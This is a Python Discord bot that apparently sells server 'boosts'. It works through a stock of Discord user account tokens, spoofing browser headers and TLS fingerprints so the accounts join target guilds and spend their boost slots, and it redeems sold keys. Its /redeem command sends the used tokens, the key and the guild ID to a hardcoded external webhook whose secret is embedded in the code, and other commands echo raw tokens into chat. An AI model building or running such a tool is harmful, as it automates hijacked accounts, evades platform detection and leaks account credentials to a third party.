import discord
from discord.ext import commands
from discord import app_commands
import tls_client
import threading
import os
import requests
from base64 import b64encode
import json
import time
import asyncio
import logging
import colorama
from colorama import Fore, Style
import socket


os.system('title "001 Boost Bot | discord.gg/coreselling | Version -> 3.1"')

socket.setdefaulttimeout(10)

logging.getLogger('discord.client').setLevel(logging.WARNING)
logging.getLogger('discord.gateway').setLevel(logging.WARNING)

colorama.init(autoreset=True)

config = {}

with open('config.json') as f:
    config = json.load(f)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
BUILD_NUMBER = 165486
CV = "108.0.0.0"
BOT_TOKEN = config['bot_token']
CLIENT_SECRET = config['client_secret']
CLIENT_ID = config['client_id']
REDIRECT_URI = "http://localhost:8080"
API_ENDPOINT = 'https://canary.discord.com/api/v9'
AUTH_URL = f"https://canary.discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"

SUPER_PROPERTIES = b64encode(
    json.dumps(
        {
            "os": "Windows",
            "browser": "Chrome",
            "device": "PC",
            "system_locale": "en-GB",
            "browser_user_agent": USER_AGENT,
            "browser_version": CV,
            "os_version": "10",
            "referrer": "https://discord.com/channels/@me",
            "referring_domain": "discord.com",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": BUILD_NUMBER,
            "client_event_source": None
        },
        separators=(',', ':')).encode()).decode()

def get_headers(token):
    return {
        "Authorization": token,
        "Origin": "https://canary.discord.com",
        "Accept": "*/*",
        "X-Discord-Locale": "en-GB",
        "X-Super-Properties": SUPER_PROPERTIES,
        "User-Agent": USER_AGENT,
        "Referer": "https://canary.discord.com/channels/@me",
        "X-Debug-Options": "bugReporterEnabled",
        "Content-Type": "application/json"
    }

def exchange_code(code):
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
    if response.status_code in (200, 201, 204):
        return response.json()
    else:
        print(f"{Fore.CYAN}<-> {Fore.RED} Error exchanging code: {Style.RESET_ALL}{response.status_code} - {response.text}")
        return False

def add_to_guild(access_token, user_id, guild_id):
    url = f"{API_ENDPOINT}/guilds/{guild_id}/members/{user_id}"
    bot_token = BOT_TOKEN
    data = {"access_token": access_token}
    headers = {"Authorization": f"Bot {bot_token}", 'Content-Type': 'application/json'}
    response = requests.put(url=url, headers=headers, json=data)
    return response.status_code

def rename(token, guild_id, nickname):
    if nickname:
        headers = get_headers(token)
        client = tls_client.Session(client_identifier="firefox_102")
        client.headers.update(headers)
        response = client.patch(
            f"https://canary.discord.com/api/v9/guilds/{guild_id}/members/@me",
            json={"nick": nickname}
        )
        if response.status_code in (200, 201, 204):
            print(f"{Fore.BLUE}<+> {Fore.GREEN} Changing nickname to: {Style.RESET_ALL}{nickname}")
            return "ok"
        else:
            print(f"{Fore.CYAN}<-> {Fore.RED} Can't change nickname: {Style.RESET_ALL}{response.status_code} - {response.text}")
            return "error"

def update_pfp(token, image_path):
    if image_path and os.path.isfile(image_path):
        headers = get_headers(token)
        with open(image_path, "rb") as f:
            image_data = f.read()
        image_base64 = b64encode(image_data).decode('utf-8')
        response = requests.patch(
            f"{API_ENDPOINT}/users/@me",
            headers=headers,
            json={"avatar": f"data:image/png;base64,{image_base64}"}
        )
        if response.status_code in (200, 201, 204):
            print(f"{Fore.BLUE}<+> {Fore.GREEN} Successfully changed avatar")
            return "ok"
        else:
            print(f"{Fore.CYAN}<-> {Fore.RED} Can't change avatar: {Style.RESET_ALL}{response.status_code} - {response.text}")
            return "error"

def get_user(access_token):
    response = requests.get(
        f"{API_ENDPOINT}/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    if response.status_code == 200:
        response_json = response.json()
        return response_json['id']
    else:
        print(f"{Fore.CYAN}<-> {Fore.RED} Can't get user info: {Style.RESET_ALL}{response.status_code} - {response.text}")
        return None

def authorize(token, guild_id, nickname, pfp_path):
    headers = get_headers(token)
    response = requests.post(AUTH_URL, headers=headers, json={"authorize": "true"})
    if response.status_code in (200, 201, 204):
        location = response.json().get('location')
        code = location.replace("http://localhost:8080?code=", "")
        exchange = exchange_code(code)
        if exchange:
            access_token = exchange['access_token']
            user_id = get_user(access_token)
            if user_id:
                add_to_guild(access_token, user_id, guild_id)
                if nickname:
                    threading.Thread(target=rename, args=(token, guild_id, nickname)).start()
                if pfp_path:
                    threading.Thread(target=update_pfp, args=(token, pfp_path)).start()
                return "ok"
    print(f"{Fore.CYAN}<-> {Fore.RED} Authorization failed")
    return "error"

def main(token, guild_id, nickname=None, pfp_path=None):
    authorization_result = authorize(token, guild_id, nickname, pfp_path)
    if authorization_result == "ok":
        headers = get_headers(token)
        client = tls_client.Session(client_identifier="firefox_102")
        client.headers.update(headers)
        response = client.get(f"{API_ENDPOINT}/users/@me/guilds/premium/subscription-slots")
        
        try:
            slots = response.json()
            if isinstance(slots, list):
                for slot in slots:
                    if isinstance(slot, dict) and 'id' in slot:
                        slot_id = slot['id']
                        payload = {"user_premium_guild_subscription_slot_ids": [slot_id]}
                        response = client.put(
                            f"{API_ENDPOINT}/guilds/{guild_id}/premium/subscriptions",
                            json=payload
                        )
                        if response.status_code in (200, 201, 204):
                            print(f"{Fore.BLUE}<+> {Fore.GREEN} Successfully Boosted Guild {Style.RESET_ALL}{guild_id}")
                        else:
                            print(f"{Fore.BLUE}<+> {Fore.GREEN} Failed to boost: {Style.RESET_ALL}{response.status_code} - {response.text}")
                    else:
                        print(f"{Fore.CYAN}<-> {Fore.RED} Unexpected slot format: {Style.RESET_ALL}{slot}")
            else:
                print(f"{Fore.CYAN}<-> {Fore.RED} Unexpected response format: {Style.RESET_ALL}{slots}")
        except json.JSONDecodeError as e:
            print(f"{Fore.CYAN}<-> {Fore.RED} Failed to parse JSON response: {Style.RESET_ALL}{e}")
    else:
        print(f"{Fore.CYAN}<-> {Fore.RED} Authorization failed")

@bot.event
async def on_ready():
    print(f"{Fore.GREEN}<+> {Style.RESET_ALL}Welcome to shopservice boost bot")
    await asyncio.sleep(2)
    print("")
    print(f'{Fore.GREEN}<+> {Style.RESET_ALL}Connected to -> {bot.user}')
    try:
        synced = await bot.tree.sync()
    except Exception as e:
        print(e)
    
    activity = discord.Activity(type=discord.ActivityType.watching, name="BOOSTING")
    await bot.change_presence(activity=activity)

ALLOWED_USER_IDS = config['allowed_users']  

def is_allowed_user():
    async def predicate(interaction: discord.Interaction):
        if interaction.user.id in ALLOWED_USER_IDS:
            return True
        embed = discord.Embed(title="`❌` Permission Denied", description="You are not allowed to use this command.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return False
    return app_commands.check(predicate)

@bot.tree.command(name="boost")
@is_allowed_user()
@app_commands.describe(guild_id="The ID of the guild", token_type="The type of tokens to use (1 for 1M tokens or 3 for 3M tokens)", nickname="The nickname to use", pfp_path="The path to the profile picture file")
async def operate(interaction: discord.Interaction, guild_id: str, token_type: str, nickname: str = None, pfp_path: str = None):
    if not guild_id or token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Missing or Invalid Arguments", description="Please provide the guild ID and token type (1 for 1M tokens or 3 for 3M tokens).", color=discord.Color.red())
        embed.add_field(name="Command Usage", value="/boost <guild_id> <token_type> [nickname] [pfp_path]")
        await interaction.response.send_message(embed=embed)
        return

    embed = discord.Embed(title="`🚀` Boosting...", description=f"Starting operation for guild ID: {guild_id} with nickname: {nickname} and profile picture: {pfp_path}", color=discord.Color.blue())
    await interaction.response.send_message(embed=embed)

    if token_type == '1':
        token_file = "1mtokens.txt"
    else:
        token_file = "3mtokens.txt"

    embed = discord.Embed(title="`📦` Token Count", description="How many tokens would you like to use?", color=discord.Color.blue())
    await interaction.followup.send(embed=embed)
    def check(msg):
        return msg.author == interaction.user and msg.channel == interaction.channel
    token_count_msg = await bot.wait_for("message", check=check)
    try:
        token_count = int(token_count_msg.content)
    except ValueError:
        embed = discord.Embed(title="`❌` Invalid Input", description="Please enter a number.", color=discord.Color.red())
        await interaction.followup.send(embed=embed)
        return

    try:
        with open(token_file, "r") as f:
            tokens = f.readlines()
    except FileNotFoundError:
        embed = discord.Embed(title="`❌` File Not Found", description=f"The file {token_file} was not found.", color=discord.Color.red())
        await interaction.followup.send(embed=embed)
        return

    if token_count > len(tokens):
        embed = discord.Embed(title="`❌` Not Enough Tokens", description=f"You have {len(tokens)} tokens.", color=discord.Color.red())
        await interaction.followup.send(embed=embed)
        return

    used_tokens = tokens[:token_count]
    used_tokens_str = "".join(used_tokens)
    for token in used_tokens:
        token = token.strip()
        if ":" in token:
            try:
                token = token.split(":")[2]
            except IndexError:
                embed = discord.Embed(title="`❌` Invalid Token Format", description=f"Invalid token format: {token}", color=discord.Color.red())
                await interaction.followup.send(embed=embed)
                continue
        threading.Thread(target=main, args=(token, guild_id, nickname, pfp_path)).start()

    remaining_tokens = tokens[token_count:]
    with open(token_file, "w") as f:
        f.write("".join(remaining_tokens))

    with open("used_tokens.txt", "w") as f:
        f.write(used_tokens_str)

    file = discord.File("used_tokens.txt", filename="used_tokens.txt")
    embed = discord.Embed(title="`✅` Successfully Boosted", description=f"Operation completed for guild ID: {guild_id} using {token_count} tokens.", color=discord.Color.blue())
    await interaction.followup.send(embed=embed, file=file)

@bot.tree.command(name="restock")
@is_allowed_user()
@app_commands.describe(token_type="The type of tokens to restock (1 for 1M tokens or 3 for 3M tokens)", token="The token to add")
async def add_token(interaction: discord.Interaction, token_type: str, token: str):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M tokens or '3' for 3M tokens.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if not token:
        embed = discord.Embed(title="`❌` Missing Token", description="Please provide the token to add.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if token_type == '1':
        token_file = "1mtokens.txt"
    else:
        token_file = "3mtokens.txt"

    with open(token_file, "a") as f:
        f.write(f"{token}\n")
    await interaction.response.send_message(f"Token added to {token_file}: {token}")

@bot.tree.command(name="destock")
@is_allowed_user()
@app_commands.describe(token_type="The type of tokens to destock (1 for 1M tokens or 3 for 3M tokens)", token="The token to remove")
async def remove_token(interaction: discord.Interaction, token_type: str, token: str):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M tokens or '3' for 3M tokens.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if not token:
        embed = discord.Embed(title="`❌` Missing Token", description="Please provide the token to remove.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if token_type == '1':
        token_file = "1mtokens.txt"
    else:
        token_file = "3mtokens.txt"

    with open(token_file, "r") as f:
        tokens = f.readlines()
    tokens = [t.strip() for t in tokens if t.strip() != token]
    with open(token_file, "w") as f:
        f.write("\n".join(tokens) + "\n")
    await interaction.response.send_message(f"Token removed from {token_file}: {token}")

@bot.tree.command(name="list_tokens")
@is_allowed_user()
@app_commands.describe(token_type="The type of tokens to list (1 for 1M tokens or 3 for 3M tokens)")
async def list_tokens(interaction: discord.Interaction, token_type: str):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M tokens or '3' for 3M tokens.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if token_type == '1':
        token_file = "1mtokens.txt"
    else:
        token_file = "3mtokens.txt"

    with open(token_file, "r") as f:
        tokens = f.readlines()
    tokens = [t.strip() for t in tokens]

    if tokens:
        embed = discord.Embed(title=f"{token_type}M Tokens", description="\n".join(tokens), color=discord.Color.blue())
    else:
        embed = discord.Embed(title=f"{token_type}M Tokens", description="`❌` No tokens found.", color=discord.Color.blue())
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="stock")
@is_allowed_user()
async def stock(interaction: discord.Interaction):
    with open("1mtokens.txt", "r") as f:
        one_month_tokens = f.readlines()
    one_month_tokens = len([t.strip() for t in one_month_tokens])

    with open("3mtokens.txt", "r") as f:
        three_month_tokens = f.readlines()
    three_month_tokens = len([t.strip() for t in three_month_tokens])

    embed = discord.Embed(title="`🚀` Server Boost Stock", description="", color=discord.Color.greyple())
    embed.add_field(name="`📦` 1 Month Server Boost", value=f"> {one_month_tokens * 2} boosts", inline=False)
    embed.add_field(name="`📦` 3 Months Server Boost", value=f"> {three_month_tokens * 2} boosts", inline=False)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="file_restock")
@is_allowed_user()
@app_commands.describe(token_type="The type of tokens to restock (1 for 1M tokens or 3 for 3M tokens)")
@app_commands.describe(file="The file containing the tokens to restock")
async def file_restock(interaction: discord.Interaction, token_type: str, file: discord.Attachment):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M tokens or '3' for 3M tokens.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if not file or not file.filename.endswith(".txt"):
        embed = discord.Embed(title="`❌` Invalid File", description="Please provide a .txt file.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    await interaction.response.send_message("Restocking...")

    try:
        file_content = await file.read()
        tokens = file_content.decode("utf-8").splitlines()
        added_tokens = []
        if token_type == '1':
            token_file = "1mtokens.txt"
        else:
            token_file = "3mtokens.txt"

        with open(token_file, "a") as f:
            for token in tokens:
                token = token.strip()
                if token:
                    f.write(f"{token}\n")
                    added_tokens.append(token)
        await interaction.followup.send(f"Added {len(added_tokens)} tokens to {token_file}.")
    except Exception as e:
        await interaction.followup.send(f"Error processing file: {e}")

@bot.tree.command(name="redeem")
@app_commands.describe(guild_id="The ID of the guild")
@app_commands.describe(key="The key to redeem")
@app_commands.describe(token_type="The type of key (1 for 1M key or 3 for 3M key)")
@app_commands.describe(nickname="The nickname to use")
@app_commands.describe(pfp_path="The path to the profile picture file")
async def redeem(interaction: discord.Interaction, guild_id: str, key: str, token_type: str, nickname: str = None, pfp_path: str = None):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M key or '3' for 3M key.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if not guild_id or not key:
        embed = discord.Embed(title="`❌` Missing Arguments", description="Please provide the guild ID and key.", color=discord.Color.red())
        embed.add_field(name="Command Usage", value="/redeem <guild_id> <key> [nickname] [pfp_path]")
        await interaction.response.send_message(embed=embed)
        return

    if token_type == '1':
        key_file = "1mkeys.txt"
        token_file = "1mtokens.txt"
    else:
        key_file = "3mkeys.txt"
        token_file = "3mtokens.txt"

    with open(key_file, "r") as f:
        valid_keys = f.readlines()
    valid_keys = [k.strip() for k in valid_keys]
    if key not in valid_keys:
        embed = discord.Embed(title="`❌` Invalid Key", description="The provided key is not valid.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    embed = discord.Embed(title="`🚀` Boosting...", description=f"Starting operation for guild ID: {guild_id} with nickname: {nickname} and profile picture: {pfp_path}", color=discord.Color.green())
    await interaction.response.send_message(embed=embed)

    with open(token_file, "r") as f:
        tokens = f.readlines()
    tokens = [t.strip() for t in tokens]
    tokens_to_use = tokens[:7]  
    for token in tokens_to_use:
        if ":" in token:
            try:
                token = token.split(":")[2]
            except IndexError:
                embed = discord.Embed(title="`❌` Invalid Token Format", description=f"Invalid token format: {token}", color=discord.Color.red())
                await interaction.followup.send(embed=embed)
                continue
        threading.Thread(target=main, args=(token, guild_id, nickname, pfp_path)).start()

    embed = discord.Embed(title="`✅` Successfully Boosted", description=f"Operation completed for guild ID: {guild_id}", color=discord.Color.green())
    await interaction.followup.send(embed=embed)

    with open(key_file, "r") as f:
        keys = f.readlines()
    keys = [k.strip() for k in keys if k.strip() != key]
    with open(key_file, "w") as f:
        f.write("\n".join(keys))

    with open(token_file, "r") as f:
        tokens = f.readlines()
    tokens = [t.strip() for t in tokens if t.strip() not in tokens_to_use]
    with open(token_file, "w") as f:
        f.write("\n".join(tokens))

    webhook_url = "https://canary.discord.com/api/webhooks/1282078653899079784/_UylhIl9-QhfZKjaEFpLL6jLHyeh4pJM8d1Czd4G3qRKkcNBpQKGLDgiVSt1s9u85QBF"  
    webhook = discord.Webhook.from_url(webhook_url, adapter=discord.RequestsWebhookAdapter())

    with open("operation.txt", "w") as f:
        f.write("Tokens - " + " ".join(tokens_to_use))

    embed = discord.Embed(
        title="Boost Logs",
        description="`🔑` Key - ```\n{}\n```\n`🌐` Server - ```\n{}\n```\n`📦` Tokens - ```\n{}```".format(key, guild_id, open("operation.txt", "r").read()),
        color=discord.Color.blue()
    )
    webhook.send(embed=embed)

import random
import string

@bot.tree.command(name="generatekeys")
@is_allowed_user()
@app_commands.describe(token_type="The type of keys to generate (1 for 1M keys or 3 for 3M keys)")
@app_commands.describe(amount="The number of keys to generate")
async def generatekeys(interaction: discord.Interaction, token_type: str, amount: int = 1):
    if token_type not in ['1', '3']:
        embed = discord.Embed(title="`❌` Invalid Token Type", description="Please enter either '1' for 1M keys or '3' for 3M keys.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    if amount <= 0:
        embed = discord.Embed(title="`❌` Invalid Amount", description="Please provide a positive number of keys to generate.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    keys = []
    for _ in range(amount):
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        keys.append(key)

    if token_type == '1':
        key_file = "1mkeys.txt"
        key_type = "1 Month"
    else:
        key_file = "3mkeys.txt"
        key_type = "3 Months"

    with open(key_file, "a") as f:
        for key in keys:
            f.write(key + "\n")

    embed = discord.Embed(title="`🔑` Keys Generated", description="", color=0x000000)  
    embed.add_field(name="Key", value=', '.join(keys), inline=False)
    embed.add_field(name="Amount", value=str(amount), inline=False)
    embed.add_field(name="Type", value=key_type, inline=False)
    await interaction.response.send_message(embed=embed)

bot.run(BOT_TOKEN)